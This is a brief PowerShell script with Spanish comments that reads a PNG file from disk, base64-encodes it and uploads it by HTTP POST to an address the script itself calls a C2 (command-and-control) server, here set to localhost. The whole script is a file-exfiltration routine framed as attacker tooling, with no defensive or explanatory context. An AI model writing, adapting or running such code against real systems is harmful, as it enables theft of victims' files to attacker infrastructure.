# Definir la ruta del archivo PNG y la URL del servidor C2
$FilePath = "C:\ruta\del\archivo.png"
$C2Url = "http://localhost:9090/upload"

# Leer el contenido del archivo PNG y codificarlo en Base64
$FileContent = [System.IO.File]::ReadAllBytes($FilePath)
$FileBase64 = [Convert]::ToBase64String($FileContent)

# Crear un cuerpo de solicitud HTTP con el archivo codificado en base64
$Body = @{
    "file" = $FileBase64
}

# Realizar la solicitud POST al servidor C2
Invoke-RestMethod -Uri $C2Url -Method Post -Body $Body -ContentType "application/json"

Write-Output "Archivo PNG cargado al servidor C2"
